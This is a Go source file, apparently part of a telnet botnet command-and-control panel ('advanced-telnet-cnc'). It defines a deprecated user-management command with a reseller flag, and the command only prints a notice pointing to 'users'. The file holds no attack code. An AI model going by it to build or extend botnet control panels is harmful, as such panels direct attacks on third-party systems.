package commands

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"adduser", "createuser", "removeuser", "edituser"},
		Description: "Creates a new user account.",
		Reseller:    true,
		Usage: []command.Argument{
			{"username", false},
			{"password", false},
			{"flags", true},
		},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			return session.Printf("%sCommand deprecated. Please use 'users' instead. If you need a list of sub-commands type users help or anything.\r\n", config.Red)
		},
	})
}
